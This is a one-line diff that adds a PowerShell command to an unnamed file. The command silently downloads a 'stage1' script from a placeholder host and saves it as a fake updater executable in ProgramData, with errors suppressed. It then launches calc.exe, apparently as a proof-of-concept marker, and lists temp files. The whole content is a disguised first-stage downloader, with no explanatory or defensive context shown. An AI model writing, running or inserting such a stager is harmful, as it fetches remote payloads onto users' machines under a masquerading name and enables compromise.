@@ -1,0 +1,1 @@
+$Stage1Url = 'https://example.net/stage1.ps1'; $OutputPath = "C:\ProgramData\updater.exe"; $TransferTimeout = 119; Invoke-WebRequest -Uri $Stage1Url -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
